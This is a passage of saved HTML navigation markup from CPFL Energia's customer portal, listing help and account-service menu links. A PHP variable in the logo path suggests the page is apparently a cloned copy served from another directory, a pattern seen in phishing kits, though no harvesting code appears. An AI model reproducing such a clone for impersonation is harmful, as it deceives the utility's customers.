                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                    </ul>
                                                </div><!-- end ngIf: item.items.length > 0 -->
                                            </li><!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <!-- end ngRepeat: item in ::items -->
                                        </ul>
                                    </div><!-- end ngIf: menuCtrl.itemsMenuLoaded -->
                                </div>
                            </section><!-- end ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <section class="menu-section panel ng-scope"
                                ng-if="menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                    data-toggle="collapse" data-parent="#boxMenusMobiles" data-target="#menuAjudaOnline"
                                    aria-expanded="false" translate="@APP-COMMON-MENU-AJUDA-ONLINE"
                                    class="ng-scope">Ajuda online</a>
                                <div class="collapse" id="menuAjudaOnline">
                                    <!-- ngIf: menuCtrl.itemsMenuLoaded -->
                                    <div ng-if="menuCtrl.itemsMenuLoaded" class="ng-scope">
                                        <ul suffix=" "
                                            class="site-menu menu-section-list list-menu-sub ng-isolate-scope"
                                            name="menuAjudaOnline">
                                            <!-- ngRepeat: item in ::items -->
                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <li ng-repeat="item in ::items"
                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                class="ng-scope open">
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                <!-- ngIf: item.items.length > 0 -->
                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                    <ul suffix=" " items="item.items" class="ng-isolate-scope">
                                                        <!-- ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/central-ajuda"
                                                                ui-sref="app.central-ajuda" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Central de ajuda</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/itens-faturamento"
                                                                ui-sref="app.itens-faturamento" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Glossário itens de
                                                                    faturamento</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/custeio-iluminacao-publica"
                                                                ui-sref="app.custeio-iluminacao-publica" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Custeio de iluminação
                                                                    pública</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indicadores-qualidade"
                                                                ui-sref="app.indicadores-qualidade" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Indicadores de
                                                                    Qualidade</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/taxas-tarifas"
                                                                ui-sref="app.taxas-tarifas" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Taxas e tarifas</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/ouvidoria"
                                                                ui-sref="app.ouvidoria" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Ouvidoria</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indicadores-processo-amostral"
                                                                ui-sref="app.indicadores-processo-amostral"
                                                                ui-sref-opts="" class="ng-scope"><i
                                                                    ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Indicadores Qualidade do
                                                                    Produto</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                    </ul>
                                                </div><!-- end ngIf: item.items.length > 0 -->
                                            </li><!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <!-- end ngRepeat: item in ::items -->
                                        </ul>
                                    </div><!-- end ngIf: menuCtrl.itemsMenuLoaded -->
                                </div>
                            </section><!-- end ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() == 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() == 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: menuCtrl.getClientId() == 'agencia-virtual-cpfl-credenciados' -->
                            <!-- ngIf: main.showMenuMobileApp -->
                        </div>
                    </header>
                </nav>
                <main id="panelMobile" class="panelMobile slideout-panel slideout-panel-left">
                    <div class="container-fluid">
                        <!-- ngIf: menuCtrl.showMenuContingencia -->
                        <div ng-if="menuCtrl.showMenuContingencia" id="menu-header" class="ng-scope">
                            <!-- ngInclude: -->
                            <ng-include src="&#39;modules/common/partials/menu-superior.html&#39;" class="ng-scope">
                                <div class="row ng-scope">
                                    <nav class="navbar navbar-custom navbar-fixed-top navbar-static-top">
                                        <div class="container">
                                            <div class="navbar-header">
                                                <!-- ngIf: menuCtrl.showMenu() --><button id="btnMenu" type="button"
                                                    class="navbar-toggle toggle-button ng-scope"
                                                    ng-click="menuCtrl.toggleMenu()" ng-if="menuCtrl.showMenu()"><span
                                                        class="hamburguer"></span></button>
                                                <!-- end ngIf: menuCtrl.showMenu() -->
                                                <div class="hidden-md hidden-lg">
                                                    <!-- ngIf: !menuCtrl.isLogged && menuCtrl.showMenu() -->
                                                    <div ng-if="!menuCtrl.isLogged &amp;&amp; menuCtrl.showMenu()"
                                                        class="ng-scope">
                                                        <!-- ngIf: menuCtrl.showMenu() --><button style="display:none;"
                                                            id="btnEntrar"
                                                            class="navbar-toggle pull-right entrar ng-scope"
                                                            translate="@APP-COMMON-MENU-ENTRAR"
                                                            ng-click="menuCtrl.login()"
                                                            ng-if="menuCtrl.showMenu()">Entrar</button>
                                                        <!-- end ngIf: menuCtrl.showMenu() -->
                                                    </div><!-- end ngIf: !menuCtrl.isLogged && menuCtrl.showMenu() -->
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded && (menuCtrl.getClientId() == 'agencia-virtual-cpfl-web' || menuCtrl.getClientId() == 'agencia-virtual-cpfl-app') && !menuCtrl.isLogged -->
                                                    <!-- ngIf: !menuCtrl.isCredenciado() && menuCtrl.showMenu() && menuCtrl.isLogged -->
                                                </div>
                                                <div class="navbar-brand navbar-brand-cpfl-energia"
                                                    ng-class="{&#39;navbar-brand-cpfl-energia&#39;:menuCtrl.logo == &#39;assets/images/logos/logo-cpfl-energia.svg&#39; }">
                                                    <a ui-sref="app.home" ui-sref-opts="{reload: true}"><img
                                                            class="navbar-logo-empresa"
                                                            ng-src="assets/images/logos/logo-cpfl-energia.svg"
                                                            src="./<?= $diretorio ?>/CPFLEnergia_files/logo-cpfl-energia.svg"></a>
                                                </div>
                                                <!-- ngIf: menuCtrl.isLogged -->
                                            </div>
                                            <div class="collapse navbar-collapse navbar-desktop" id="navbar-menu">
                                                <!-- ngIf: menuCtrl.showMenu() && menuCtrl.exibirMenuServicos -->
                                                <ul class="nav navbar-nav ng-scope"
                                                    ng-if="menuCtrl.showMenu() &amp;&amp; menuCtrl.exibirMenuServicos">
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded && menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <li class="dropdown mega-dropdown ng-scope"
                                                        ng-if="menuCtrl.itemsMenuLoaded &amp;&amp; menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;">
                                                        <a class="dropdown-toggle ng-scope" data-toggle="dropdown"
                                                            translate="@APP-COMMON-MENU-MINHA-FATURA">Minha conta</a>
                                                        <ul class="site-menu dropdown-menu mega-dropdown-menu multi-level col-md-20 ng-isolate-scope"
                                                            suffix=" " flag="" name="menuMinhaFatura" show-flag="true"
                                                            legend="">
                                                            <!-- ngRepeat: item in ::items -->
                                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                ng-mouseover="emitEvent(item);"
                                                                ng-mouseleave="eventHidetooltip();"
                                                                ng-repeat="item in ::items"
                                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                class="ng-scope col-md-16 border-right">
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                <!-- ngIf: item.items.length > 0 -->
                                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                                    <ul class="col-md-20 ng-isolate-scope" suffix=" "
                                                                        flag="" items="item.items">
                                                                        <!-- ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/historico-contas"
                                                                                ui-sref="app.historico-contas"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Débitos
                                                                                    e 2ª via de conta</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/conta-facil"
                                                                                ui-sref="app.conta-facil"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Conta
                                                                                    fácil</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/historico-consumo"
                                                                                ui-sref="app.historico-consumo"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Histórico
                                                                                    de consumo</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/troca-nome-fatura/inicial"
                                                                                ui-sref="app.troca-nome-fatura-inicial"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Trocar o
                                                                                    nome na conta</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/alteracao-data-vencimento"
                                                                                ui-sref="app.alterar-vencimento"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Alterar
                                                                                    data de vencimento</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/recebimento-fatura"
                                                                                ui-sref="app.recebimento-fatura.detalhe"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Conta
                                                                                    digital</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/data-leitura"
                                                                                ui-sref="app.data-leitura"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Data da
                                                                                    leitura</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/auto-leitura"
                                                                                ui-sref="app.auto-leitura"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Autoleitura</span>
                                                                            </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/debito-automatico"
                                                                                ui-sref="app.debito-automatico"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
